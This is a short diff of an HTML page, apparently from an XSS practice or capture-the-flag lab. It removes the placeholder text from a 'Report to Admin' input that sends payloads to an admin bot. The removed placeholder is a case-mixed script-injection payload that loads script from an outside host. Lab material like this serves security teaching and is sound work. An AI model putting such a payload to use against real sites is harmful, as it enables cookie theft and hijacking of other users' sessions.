@@ -34,7 +34,7 @@
             <h3>Report to Admin</h3>
             <p>Found a vulnerability? Enter your payload below to notify the admin.</p>
             <div>
-                <input type="text" id="payload-input" placeholder="<sCRiPt sRC=//xs.pe/6HW></sCrIpT>">
+                <input type="text" id="payload-input">
                 <button onclick="AdminBot.send('level1', 'payload-input')">Send to Admin Bot</button>
             </div>
             <div style="margin-top: 10px; font-size: 12px; font-family: 'Share Tech Mono';">
